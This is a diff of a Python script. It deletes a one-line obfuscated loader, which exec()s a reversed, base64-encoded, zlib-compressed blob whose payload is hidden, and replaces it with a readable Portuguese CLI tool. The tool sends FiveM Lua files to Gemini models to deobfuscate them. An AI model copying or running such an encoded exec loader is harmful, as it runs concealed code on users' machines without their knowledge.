@@ -1,2 +1,302 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+import os
+import asyncio
+import google.generativeai as genai
+from pathlib import Path
+import time
+from datetime import datetime
+import sys
+
+class Colors:
+    PURPLE    = '\x1b[95m'
+    CYAN      = '\x1b[96m'
+    DARK_CYAN = '\x1b[36m'
+    BLUE      = '\x1b[94m'
+    GREEN     = '\x1b[92m'
+    YELLOW    = '\x1b[93m'
+    RED       = '\x1b[91m'
+    BOLD      = '\x1b[1m'
+    UNDERLINE = '\x1b[4m'
+    END       = '\x1b[0m'
+
+
+def print_banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    banner = f"""
+{Colors.PURPLE}{Colors.BOLD}
+╔═══════════════════════════════════════════════════════════╗
+║                                                           ║
+║      ███████╗██╗  ██╗ █████╗ ██████╗                     ║
+║      ██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗                    ║
+║      █████╗   ╚███╔╝ ███████║██████╔╝                    ║
+║      ██╔══╝   ██╔██╗ ██╔══██║██╔═══╝                     ║
+║      ██║     ██╔╝ ██╗██║  ██║██║                         ║
+║      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝                         ║
+║                                                           ║
+║              {Colors.CYAN}L I M P A D O R   L U A{Colors.PURPLE}                    ║
+║         {Colors.CYAN}discord.gg/RkfQN5g3V{Colors.PURPLE}                            ║
+╚═══════════════════════════════════════════════════════════╝
+{Colors.END}
+"""
+    print(banner)
+    print(f"{Colors.DARK_CYAN}{'=' * 65}{Colors.END}")
+
+
+def print_header(text):
+    padding = 4
+    width = len(text) + padding * 2
+    top    = '╔' + '═' * width + '╗'
+    middle = '║' + ' ' * padding + text + ' ' * padding + '║'
+    bottom = '╚' + '═' * width + '╝'
+    print(f"\n{Colors.BLUE}{Colors.BOLD}{top}{Colors.END}")
+    print(f"{Colors.BLUE}{Colors.BOLD}{middle}{Colors.END}")
+    print(f"{Colors.BLUE}{Colors.BOLD}{bottom}{Colors.END}")
+
+
+def print_status(message, status='info'):
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    if status == 'success':
+        symbol = f"{Colors.GREEN}✓{Colors.END}"
+    elif status == 'error':
+        symbol = f"{Colors.RED}✗{Colors.END}"
+    elif status == 'warning':
+        symbol = f"{Colors.YELLOW}[AVISO]{Colors.END}"
+    elif status == 'working':
+        symbol = f"{Colors.CYAN}[..]{Colors.END}"
+    else:
+        symbol = f"{Colors.BLUE}[INFO]{Colors.END}"
+    print(f"{Colors.DARK_CYAN}[{timestamp}]{Colors.END} {symbol} {message}")
+
+
+def print_progress_bar(iteration, total, prefix='', suffix='', length=50, fill='█'):
+    percent      = '{0:.1f}'.format(100 * (iteration / float(total)))
+    filled_length = int(length * iteration // total)
+    bar          = fill * filled_length + '-' * (length - filled_length)
+    progress_bar = f"{Colors.PURPLE}{bar}{Colors.END}"
+    print(f'\r{prefix} |{progress_bar}| {percent}% {suffix}', end='\r')
+    if iteration == total:
+        print()
+
+
+def get_api_key():
+    print_header('CONFIGURAÇÃO DA API')
+    print(f"\n{Colors.YELLOW}⚠  Você precisa de uma chave de API do Google Gemini para usar o Limpador.{Colors.END}")
+    print(f"{Colors.CYAN}• Obtenha uma em: https://aistudio.google.com/app/apikey{Colors.END}")
+    print(f"{Colors.CYAN}• Sua chave não será salva e será usada apenas nesta sessão{Colors.END}\n")
+    while True:
+        api_key = input(f"{Colors.BOLD}Digite sua chave da API Gemini:{Colors.END} ").strip()
+        if api_key:
+            print_status('Chave da API aceita!', 'success')
+            return api_key
+        print_status('Por favor, insira uma chave de API válida', 'error')
+
+
+def build_prompt(code: str) -> str:
+    return f"""Você é um especialista em desofuscação de código Lua para FiveM/GTA RP.
+
+O código abaixo foi gerado por um compilador/ofuscador Lua que converte variáveis locais para nomes genéricos como L0_1, L1_1, L2_1, A0_2, A1_2, etc. Sua tarefa é reverter isso para código legível e limpo.
+
+REGRAS OBRIGATÓRIAS:
+1. Analise o contexto e uso de cada variável (L0_1, L1_1, etc.) e renomeie para nomes descritivos em inglês (ex: playerCoords, vehicleId, isOnDuty, callback, etc.)
+2. Renomeie parâmetros de função (A0_2, A1_2) para nomes descritivos baseados no que recebem
+3. Simplifique atribuições múltiplas desnecessárias (ex: L1_2 = func; L2_2 = arg; L1_2(L2_2) vira func(arg))
+4. Remova variáveis intermediárias desnecessárias que só servem de alias
+5. Mantenha a lógica, eventos, callbacks e funcionalidade 100% idênticos ao original
+6. Use indentação de 4 espaços
+7. Mantenha todos os nomes de eventos, NUI callbacks e server callbacks EXATAMENTE iguais
+8. Retorne APENAS o código Lua limpo, sem explicações, sem markdown, sem ```
+
+Código para desofuscar e limpar:
+{code}"""
+
+
+MODELS = [
+    'gemini-2.5-flash',
+    'gemini-2.0-flash',
+    'gemini-2.0-flash-lite',
+    'gemini-exp-1206',
+    'gemini-2.0-flash-001',
+]
+
+INPUT_DIR  = 'Input'
+OUTPUT_DIR = 'Output'
+
+current_model_index = 0
+
+
+def get_next_model():
+    """Retorna o próximo modelo disponível na lista."""
+    global current_model_index
+    current_model_index += 1
+    if current_model_index < len(MODELS):
+        return genai.GenerativeModel(MODELS[current_model_index])
+    return None
+
+
+import re as _re
+
+def _extract_retry_delay(error_msg: str) -> int:
+    match = _re.search(r'retry_delay\s*\{\s*seconds:\s*(\d+)', str(error_msg))
+    if match:
+        return int(match.group(1)) + 1
+    return 5
+
+
+def clean_lua_code(model_holder: list, code: str, filename: str) -> str:
+    """Manda o código Lua completo pro Gemini e retorna limpo. Troca de modelo se atingir rate limit."""
+    prompt = f"""You are an expert Lua programmer.
+Task: Clean, deobfuscate, and refactor the code below.
+1. Rename obfuscated variables (L0_1, L1_1, A0_2, etc.) to meaningful names based on context.
+2. Deobfuscate variable names where obvious.
+3. Simplify redundant intermediate variable assignments.
+4. Keep all event names, callback names and game function calls exactly the same.
+5. Return ONLY raw Lua code.
+
+{code}"""
+
+    while model_holder[0] is not None:
+        model = model_holder[0]
+        try:
+            response = model.generate_content(
+                prompt,
+                generation_config=genai.types.GenerationConfig(
+                    temperature=0.1,
+                    max_output_tokens=65536,
+                )
+            )
+            result = response.text.strip()
+            if result.startswith('```'):
+                result = result.split('\n', 1)[1] if '\n' in result else result
+                result = result.rsplit('```', 1)[0].strip()
+            return result
+        except Exception as e:
+            err_str = str(e)
+            if '429' in err_str:
+                next_model = get_next_model()
+                if next_model:
+                    model_holder[0] = next_model
+                    print_status(f"Rate limited, switching to {MODELS[current_model_index]}", 'warning')
+                else:
+                    wait = _extract_retry_delay(err_str)
+                    print_status(f"Todos os modelos esgotados. Aguardando {wait}s...", 'warning')
+                    time.sleep(wait)
+                    # Reinicia do primeiro modelo
+                    current_model_index_reset = 0
+                    model_holder[0] = genai.GenerativeModel(MODELS[0])
+            else:
+                print_status(f"Erro: {e}", 'error')
+                return code  # devolve original em caso de erro não-quota
+
+    return code
+
+
+def split_into_chunks(code: str, max_lines: int = 150) -> list[str]:
+    """Divide o código em blocos de max_lines linhas respeitando funções."""
+    lines = code.split('\n')
+    if len(lines) <= max_lines:
+        return [code]
+
+    chunks = []
+    current = []
+    for line in lines:
+        current.append(line)
+        # Tenta cortar em fim de função ou bloco vazio entre funções
+        if len(current) >= max_lines:
+            stripped = line.strip()
+            if stripped == 'end' or stripped == '' or stripped.startswith('--'):
+                chunks.append('\n'.join(current))
+                current = []
+    if current:
+        chunks.append('\n'.join(current))
+    return chunks
+
+
+async def process_file(model_holder: list, input_path: Path, output_path: Path, file_index: int, total_files: int):
+    """Processa um arquivo .lua completo de uma vez."""
+    filename = input_path.name
+    print_status(f"[{file_index}/{total_files}] Processando: {Colors.CYAN}{filename}{Colors.END}", 'working')
+
+    code = input_path.read_text(encoding='utf-8', errors='ignore')
+    lines = code.split('\n')
+    print_status(f"  Linhas originais: {len(lines)}", 'info')
+
+    cleaned_code = await asyncio.to_thread(clean_lua_code, model_holder, code, filename)
+
+    if cleaned_code and cleaned_code != code:
+        cleaned_lines = cleaned_code.split('\n')
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+        output_path.write_text(cleaned_code, encoding='utf-8')
+        print_status(f"  ✓ Successfully cleaned {filename}", 'success')
+        print_status(f"  Linhas: {len(lines)} → {len(cleaned_lines)}", 'info')
+        return True
+    else:
+        print_status(f"  Failed to clean {filename}", 'error')
+        return False
+
+
+async def main_async(api_key: str):
+    global current_model_index
+    current_model_index = 0
+
+    genai.configure(api_key=api_key)
+    print_status('API do Gemini configurada com sucesso!', 'success')
+
+    model_holder = [genai.GenerativeModel(MODELS[0])]
+    print_status(f"Modelo inicial: {Colors.GREEN}{MODELS[0]}{Colors.END}", 'success')
+
+    # Verifica pasta Input
+    input_dir = Path(INPUT_DIR)
+    if not input_dir.exists():
+        input_dir.mkdir(parents=True)
+        print_status(f"Pasta '{INPUT_DIR}' criada. Coloque seus arquivos .lua lá e rode novamente.", 'warning')
+        return
+
+    lua_files = list(input_dir.rglob('*.lua'))
+    if not lua_files:
+        print_status(f"Nenhum arquivo .lua encontrado em '{INPUT_DIR}'.", 'warning')
+        return
+
+    print_status(f"Encontrados {Colors.CYAN}{len(lua_files)}{Colors.END} arquivo(s) .lua", 'info')
+    print(f"\n{Colors.DARK_CYAN}{'=' * 65}{Colors.END}\n")
+
+    output_dir = Path(OUTPUT_DIR)
+    output_dir.mkdir(parents=True, exist_ok=True)
+
+    start_time = time.time()
+    success_count = 0
+
+    for i, input_path in enumerate(lua_files, 1):
+        relative = input_path.relative_to(input_dir)
+        output_path = output_dir / relative
+
+        ok = await process_file(model_holder, input_path, output_path, i, len(lua_files))
+        if ok:
+            success_count += 1
+        print()
+
+    elapsed = time.time() - start_time
+    print(f"\n{Colors.DARK_CYAN}{'=' * 65}{Colors.END}")
+    print_status(f"Concluído! {success_count}/{len(lua_files)} arquivo(s) processado(s) em {elapsed:.1f}s", 'success')
+    print_status(f"Arquivos salvos em: {Colors.GREEN}{output_dir.resolve()}{Colors.END}", 'info')
+
+
+def main():
+    print_banner()
+    api_key = get_api_key()
+
+    print(f"\n{Colors.DARK_CYAN}{'=' * 65}{Colors.END}\n")
+
+    try:
+        asyncio.run(main_async(api_key))
+    except KeyboardInterrupt:
+        print(f"\n{Colors.YELLOW}Interrompido pelo usuário.{Colors.END}")
+    except Exception as e:
+        print_status(f"Erro inesperado: {e}", 'error')
+        import traceback
+        traceback.print_exc()
+
+    print(f"\n{Colors.BLUE}Pressione Enter para sair...{Colors.END}")
+    input()
+
+
+if __name__ == '__main__':
+    main()
